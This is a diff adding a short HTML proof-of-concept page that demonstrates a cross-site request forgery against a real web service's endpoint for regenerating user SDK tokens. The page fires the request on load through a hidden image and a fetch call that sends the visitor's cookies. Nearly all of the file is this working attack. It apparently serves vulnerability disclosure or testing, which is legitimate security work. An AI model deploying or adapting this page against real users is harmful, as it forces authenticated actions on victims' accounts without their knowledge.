@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF PoC - Regenerate Token</title>
+</head>
+<body>
+  <h1>CSRF PoC: Regenerate SDK Token</h1>
+  <img src="https://app.flourish.studio/api/user/generate_sdk_token" style="display:none" alt="CSRF Test" />
+  <script>
+    fetch('https://app.flourish.studio/api/user/generate_sdk_token', {
+      method: 'GET',
+      credentials: 'include' // send cookies for authentication
+    }).then(response => {
+      console.log('CSRF request sent. Status:', response.status);
+    }).catch(err => console.error('Error sending CSRF request:', err));
+  </script>
+</body>
+</html>
+
+
+
